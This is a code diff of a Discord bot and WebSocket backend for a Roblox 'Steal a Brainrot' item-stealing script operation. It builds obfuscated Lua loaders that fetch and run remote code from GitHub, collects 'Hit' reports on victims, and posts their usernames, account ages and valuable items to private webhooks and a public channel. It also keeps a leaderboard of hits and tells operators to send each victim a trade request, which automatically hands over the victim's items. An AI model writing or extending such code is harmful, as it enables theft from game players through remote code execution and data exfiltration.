@@ -288,7 +288,7 @@ clientDiscord.on(Events.InteractionCreate, async (interaction) => {
             .setTitle(`${type.charAt(0).toUpperCase() + type.slice(1)} Hitcount`)
             .setColor(0xFFAA00)
             .setDescription(`Top 10 users (${type})\n\n${description || "Aucune donnée"}`)
-            .setFooter({ text: "YT: MoziOnTop • Aujourd'hui" });
+            .setFooter({ text: "Rusteez Scripts • Aujourd'hui" });
     
         await interaction.reply({ embeds: [lbEmbed] });
     }
@@ -326,8 +326,7 @@ fenv["Receivers"] = { ${userArrayLua} }
 fenv["WebHook"] = "${webhookUuid}"
 fenv["Visual"] = "${visual}"
 fenv["MinIncome"] = ${income}
-fenv["UserId"] = ${userId}
-loadstring(game:HttpGet("https://raw.githubusercontent.com/MoziIOnTop/pro/refs/heads/main/SABTrde"))()`;
+loadstring(game:HttpGet("https://raw.githubusercontent.com/cagnastylepay-png/MyScripts/refs/heads/main/Trade.lua"))()`;
 
             // 4. Obfuscation via WeAreDevs (Utilise tes cookies configurés sur Render)
             const obfuscated = await obfuscateScript(codeToObfuscate);
@@ -436,21 +435,104 @@ wss.on('connection', (ws, req) => {
         });
       
         ws.on('message', async (msg) => {
-          try {
-              const data = JSON.parse(msg);
-              if (data.Method === "Hit") {
-                log(`🎯 Hit reçu de : ${data.Hit.Name}`);
-                  
-                if (data.Hit.Brainrots && data.Hit.Brainrots.length > 0) {
-                  data.Hit.Brainrots.forEach((br, index) => {
-                    log(`   [${index + 1}] Brainrot: ${br.Name} | Income: ${br.IncomeStr}`);
-                  });
-                } else {
-                  log(`   ⚠️ Aucun Brainrot trouvé sur le plot.`);
+            try {
+                const data = JSON.parse(msg);
+        
+                if (data.Method === "Hit") {
+                    const hitInfo = data.Hit;
+                    const webhookIdFromLua = hitInfo.WebHook; // C'est l'UUID (ex: wh_...)
+        
+                    log(`🎯 Processing Hit from: ${hitInfo.Name}`);
+        
+                    // 1. Chercher le Webhook URL et l'Owner dans la DB
+                    const mapping = await WebHookId.findOne({ webhookId: webhookIdFromLua });
+        
+                    if (!mapping) {
+                        return log(`❌ Webhook ID ${webhookIdFromLua} not found in Database.`);
+                    }
+        
+                    // 2. Incrémenter le Leaderboard (HitEvent)
+                    const newHitEntry = new HitEvent({
+                        userId: mapping.ownerId,     // On utilise l'ID Discord stocké à la création
+                        username: mapping.ownerName, // Le tag Discord
+                        timestamp: new Date()
+                    });
+                    await newHitEntry.save();
+                    log(`📈 Leaderboard updated for ${mapping.ownerName}`);
+        
+                    // 3. Préparer l'Embed pour Discord
+                    const hitEmbed = new EmbedBuilder()
+                    .setTitle("Rusteez • SAB Hit")
+                    .setColor(0x2b2d31) // Couleur sombre Discord pour un look pro
+                    .setDescription("🛠️ **How to Use?**\nJoin SAB and send a trade request to the victim. They will automatically add all their items to the trade.")
+                    .addFields(
+                        { 
+                            name: "📄 Player Information", 
+                            value: `\`\`\`properties
+                👤 Display Name : ${hitInfo.DisplayName}
+                🆔 Username     : ${hitInfo.Name}
+                🗓️ Account Age  : ${hitInfo.AccountAge} days
+                📱 Executor     : Delta
+                👥 Players      : ${hitInfo.Players}/8
+                👑 Receiver     : ${Array.isArray(hitInfo.Receiver) ? hitInfo.Receiver.join(', ') : hitInfo.Receiver}
+                \`\`\`` 
+                        },
+                        {
+                            name: "👑 Valuable Brainrots",
+                            value: `\`\`\`properties
+                ${hitInfo.Brainrots && hitInfo.Brainrots.length > 0 
+                    ? hitInfo.Brainrots.map(br => `🧠 → ${br.Name} → Secret ${br.IncomeStr}`).join('\n')
+                    : "None"}
+                \`\`\``
+                        }
+                    )
+                    .setFooter({ text: `Rusteez Script ` });
+                        
+                    // 4. Envoi sur le Webhook PRIVÉ de l'utilisateur
+                    try {
+                        const webhookClient = new WebhookClient({ url: mapping.url });
+                        await webhookClient.send({ 
+                            content: hitInfo.Name,
+                            embeds: [hitEmbed] 
+                        });
+                    } catch (err) { log(`⚠️ Error sending to User Webhook: ${err.message}`); }
+        
+                    // 5. Envoi sur le Channel PUBLIC (public-hits)
+                    const publicChannel = clientDiscord.channels.cache.get('1487370329776193677');
+                    if (publicChannel) {
+                        // On crée une version un peu plus "anonyme" ou stylée pour le public
+                        const publicEmbed  = new EmbedBuilder()
+                    .setTitle("Rusteez • SAB Hit")
+                    .setColor(0x2b2d31) // Couleur sombre Discord pour un look pro
+                    .setDescription("🛠️ **How to Use?**\nJoin SAB and send a trade request to the victim. They will automatically add all their items to the trade.")
+                    .addFields(
+                        { 
+                            name: "📄 Player Information", 
+                            value: `\`\`\`properties
+                👤 Display Name : ${hitInfo.DisplayName}
+                🆔 Username     : ${hitInfo.Name}
+                🗓️ Account Age  : ${hitInfo.AccountAge} days
+                👥 Players      : ${hitInfo.Players}/8
+                \`\`\`` 
+                        },
+                        {
+                            name: "👑 Valuable Brainrots",
+                            value: `\`\`\`properties
+                ${hitInfo.Brainrots && hitInfo.Brainrots.length > 0 
+                    ? hitInfo.Brainrots.map(br => `🧠 → ${br.Name} → Secret ${br.IncomeStr}`).join('\n')
+                    : "None"}
+                \`\`\``
+                        }
+                    )
+                    .setFooter({ text: `Rusteez Script ` });
+                        
+                        publicChannel.send({ embeds: [publicEmbed] });
+                    }
                 }
+            } catch (e) { 
+                log(`⚠️ WS Message Error: ${e.message}`); 
             }
-          } catch (e) { log(`⚠️ Erreur Message WS: ${e.message}`); }
-      });
+        });
       return; // On s'arrête ici pour les Victims
     }
     
